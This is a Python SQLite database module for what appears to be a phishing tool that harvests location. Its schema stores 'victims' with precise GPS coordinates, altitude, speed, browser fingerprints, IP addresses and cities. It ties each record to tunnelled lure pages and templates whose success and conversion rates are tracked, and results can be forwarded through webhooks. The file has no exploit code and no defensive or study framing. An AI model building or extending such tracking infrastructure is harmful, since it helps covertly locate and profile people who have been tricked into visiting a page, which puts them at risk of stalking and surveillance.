import sqlite3
from config import DATABASE_PATH

class Database:
    def __init__(self, db_path=DATABASE_PATH):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.conn.execute("PRAGMA journal_mode=WAL")
        self.conn.execute("PRAGMA foreign_keys=ON")
        self._create_tables()

    def _create_tables(self):
        self.conn.executescript("""
        CREATE TABLE IF NOT EXISTS tunnels (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT,
            local_port INTEGER,
            process_pid INTEGER,
            status TEXT DEFAULT 'running',
            template_id INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            stopped_at TIMESTAMP,
            auto_stop_at TIMESTAMP,
            restart_count INTEGER DEFAULT 0,
            max_restarts INTEGER DEFAULT 3,
            last_error TEXT,
            health_check_at TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tunnel_id INTEGER,
            template_name TEXT,
            lat REAL,
            lng REAL,
            accuracy REAL,
            altitude REAL,
            speed REAL,
            user_agent TEXT,
            fingerprint TEXT,
            ip_address TEXT,
            country TEXT,
            city TEXT,
            is_valid INTEGER DEFAULT 1,
            is_duplicate INTEGER DEFAULT 0,
            received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (tunnel_id) REFERENCES tunnels(id) ON DELETE SET NULL
        );
        CREATE TABLE IF NOT EXISTS templates (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT UNIQUE,
            title TEXT,
            filename TEXT,
            active INTEGER DEFAULT 1,
            use_count INTEGER DEFAULT 0,
            success_count INTEGER DEFAULT 0,
            conversion_rate REAL DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS webhooks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            platform TEXT,
            url TEXT,
            active INTEGER DEFAULT 1,
            last_sent_at TIMESTAMP,
            error_count INTEGER DEFAULT 0,
            max_errors INTEGER DEFAULT 5,
            retry_interval INTEGER DEFAULT 10
        );
        CREATE TABLE IF NOT EXISTS config (
            key TEXT PRIMARY KEY,
            value TEXT,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            type TEXT,
            data TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        """)
        self.conn.commit()

    def execute(self, query, params=None):
        cur = self.conn.execute(query, params or [])
        self.conn.commit()
        return cur

    def fetchone(self, query, params=None):
        cur = self.conn.execute(query, params or [])
        return cur.fetchone()

    def fetchall(self, query, params=None):
        cur = self.conn.execute(query, params or [])
        return cur.fetchall()

    def close(self):
        self.conn.close()
